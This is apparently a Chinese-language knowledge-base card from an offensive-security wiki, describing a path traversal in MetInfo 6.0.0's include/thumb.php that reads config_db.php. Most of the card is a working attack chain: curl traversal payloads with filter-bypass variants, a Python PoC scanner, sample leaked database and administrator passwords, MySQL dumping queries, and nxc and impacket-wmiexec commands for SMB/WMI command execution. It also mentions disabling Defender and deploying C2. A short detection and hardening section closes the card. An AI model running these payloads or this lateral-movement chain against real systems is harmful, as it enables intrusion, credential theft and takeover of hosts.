---
id: web-generic-file-inclusion-metinfo-thumb-dir-config-read
title: MetInfo 6.0.0 include/thumb.php dir 路径穿越读取 config_db.php 数据库凭据
type: scenario
domain: web
path: web/generic/file-inclusion
technique: metinfo-thumb-dir-path-traversal-config-read
tags:
- php
- metinfo
- cms
- path-traversal
- arbitrary-file-read
- credential-leak
- n-day
cve: []
severity: high
confidence: high
affected_versions: MetInfo 6.0.0（原文靶机版本；原文未给出修复版本与影响区间）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V82
  verified_at: '2026-11-05T17:58:53+08:00'
  notes: 已对照原文与图01-04核对：图02 后台登录页页脚 Powered by MetInfo 6.0.0；正文 exploit 脚本 4 个 dir 变体请求 /include/thumb.php，返回 config_db.php 的 con_db_id=metinfo/con_db_pass=admin@cslab；mysql 连接 172.50.66.3:3306 后在 met_password 取得 cs1ab@wwq；图03 nxc smb administrator:cs1ab@wwq 显示 Pwn3d! 且 whoami=win-ajigq5jspvf\administrator，图04 为后续 Vshell 客户端管理。卡内 PoC/字段与原文一致。原文未给 thumb.php 源码，具体过滤绕过为卡内已声明的推断。affected_versions 保留原文观测的 MetInfo 6.0.0（标题/正文一致，原文未给修复版本与区间）。未验证点：未复跑 PoC。frontmatter 无 sources/source_url。
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-metinfo-thumb-dir-config-read/
draft: false
kb_aliases:
- MetInfo 任意文件读取
- thumb.php dir 穿越
- MetInfo 6.0.0 文件读取
- config_db.php 泄露
- 米拓建站 文件读取
- MetInfo Nday
---

## 一句话结论

MetInfo 6.0.0 的 `/include/thumb.php` 接受 `dir` 参数拼接待读取路径，未正确阻止目录穿越；用 `..././`、`.....///` 或反斜杠等变体绕过过滤后即可读取 `config/config_db.php`，拿到 MySQL 账号密码，再结合暴露的 3306 端口登录数据库、翻出管理员密码并横向到 SMB/WMI。

## 原理

- `thumb.php` 是 MetInfo 的缩略图处理入口，通常会根据 `dir` 参数定位图片文件并生成缩略图；如果直接把 `dir` 拼进文件路径且只做简单字符串过滤（如只删一次 `../`、只检查前缀），攻击者可用规范化变体让过滤后的字符串重新组合成 `../`，实现目录穿越。
- 文章使用的 payload 包括 `..././http/..././config/config_db.php`、`.....///http/.....///config/config_db.php`、`http/.....///.....///config/config_db.php`、`http\..\..\config\config_db.php`：核心是让 `..././`、`.....///` 在过滤/归一化后等价于 `../`，Windows 下还可使用反斜杠。原文未给出 thumb.php 源码，因此具体过滤绕过逻辑属于基于 payload 形态的推断。
- 读取目标 `config/config_db.php` 是 MetInfo 的数据库配置文件，内含 `con_db_host`、`con_db_port`、`con_db_id`、`con_db_pass`、`con_db_name`、`tablepre` 等；攻击者拿到后可直接连接 MySQL。
- 文章靶机的 3306 对外暴露，使用泄露的 `metinfo/admin@cslab` 登录后，在 `met_password` 表中找到另一条口令 `cs1ab@wwq`；该口令可复用到 Windows 管理员账号，配合 SMB/WMI 执行命令。
- 因此这是一条“文件读取 → 配置凭据泄露 → 数据库横向 → 口令复用 → 系统命令执行”的完整链；即使数据库不对外，配置文件泄露本身也足以支撑后续攻击。

## 触发条件

- 目标为 MetInfo 6.0.0（或存在相同 `thumb.php?dir=` 路径穿越缺陷的版本），`/include/thumb.php` 可直接访问。
- Web 进程对 `config/config_db.php` 有读权限（正常安装即有）。
- 过滤可被 `..././`、`.....///`、反斜杠等变体绕过；不同版本/补丁可能已修复。
- 数据库端口对外暴露或可从当前网络访问，且配置中的账号可远程登录；否则只能停留在凭据泄露阶段。

## 利用步骤

1. 指纹识别：访问首页/后台 `/admin`，页脚显示 `Powered by MetInfo 6.0.0`；确认 `/include/thumb.php` 存在。
2. 用 `dir` 参数尝试穿越读取数据库配置，逐个尝试变体：
   ```bash
   curl -s 'http://<target>/include/thumb.php?dir=..././http/..././config/config_db.php'
   curl -s 'http://<target>/include/thumb.php?dir=.....///http/.....///config/config_db.php'
   curl -s 'http://<target>/include/thumb.php?dir=http/.....///.....///config/config_db.php'
   curl -s 'http://<target>/include/thumb.php?dir=http\..\..\config\config_db.php'
   ```
   响应中出现 `<?php` 与 `con_db_pass` 即成功。
3. 解析 `con_db_host/con_db_port/con_db_id/con_db_pass/con_db_name`，连接 MySQL：
   ```bash
   mysql -h <target> -P 3306 -u <db_user> -p'<db_pass>' <db_name> --skip-ssl
   ```
4. 枚举表与凭据，重点看 `met_password`、`met_admin_table`、`met_user` 等：
   ```sql
   show tables;
   select * from met_password;
   select * from met_admin_table;
   ```
5. 用拿到的口令尝试 SMB/WMI（文章用 `administrator:cs1ab@wwq`）：
   ```bash
   nxc smb <target> -u administrator -p 'cs1ab@wwq' -x "whoami"
   impacket-wmiexec administrator:'cs1ab@wwq'@<target> -codec gbk
   ```
6. 获得命令执行后按环境继续（关闭/绕过 Defender、上线 C2、内网扫描等）。

## PoC

```python
import requests, sys

HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"}
PAYLOADS = [
    "..././http/..././config/config_db.php",
    ".....///http/.....///config/config_db.php",
    "http/.....///.....///config/config_db.php",
    r"http\..\..\config\config_db.php",
]

def exploit(host):
    url = f"{host.rstrip('/')}/include/thumb.php"
    for payload in PAYLOADS:
        try:
            resp = requests.get(url, params={"dir": payload}, headers=HEADERS, timeout=10)
            if "<?php" in resp.text:
                print(f"[+] Vulnerable!\n{resp.text}")
                return
        except Exception as e:
            print(f"[-] Error: {e}")
    print("[-] Not vulnerable")

if __name__ == "__main__":
    exploit(sys.argv[1])
```

```text
# 成功回显（节选）
<?php
con_db_host = "localhost"
con_db_port = "3306"
con_db_id   = "metinfo"
con_db_pass  = "admin@cslab"
con_db_name = "metinfo"
tablepre    =  "met_"
?>
```

## 变体与关联

- 变体：穿越目标可以是 `config/config_db.php`、日志、备份、其他配置文件；路径深度按站点目录结构调整。
- 变体：过滤规则不同，可尝试 `....//`、`..%2f`、`%2e%2e%2f`、双写 `....//`、反斜杠、`....\/` 等；Windows 目标优先试反斜杠。
- 变体：若数据库不对外，可继续用文件读取读取管理员会话/配置，或寻找其他写入点。
- 边界：`thumb.php` 被删除/重命名、PHP 禁用相关函数、`open_basedir` 限制到 Web 根之外不可读、WAF 拦截 `../` 变体时，本路径不成立。
- 关联：[[web-generic-sqli-metinfo-search-para-base64-blind]]（同 CMS 的另一条漏洞链）、[[web-php-wordpress-backup-sql-phpass-credential]]（配置文件/备份泄露凭据的同类思路）、[[pentest-initial-access-password-semantic-mutation-reuse]]（数据库口令复用到系统账号）。

## 检测与防御

- 检测：`/include/thumb.php` 请求的 `dir` 中出现 `../`、`..././`、`.....///`、反斜杠、URL 编码的 `%2e%2e` 等穿越特征；同一来源连续尝试多个变体；响应中返回 `<?php`/`con_db_` 等配置内容。
- 修复：对 `dir` 做规范化后校验 `realpath` 必须位于允许的缩略图目录内，拒绝任何 `..`、绝对路径与反斜杠；升级 MetInfo 到修复版本或移除 `thumb.php`。
- 加固：数据库端口只对受信网段开放，Web 数据库账号最小权限；不要把系统管理员口令复用为数据库/网站口令；WAF 拦截路径穿越特征；定期审计 Web 目录中的配置文件权限。
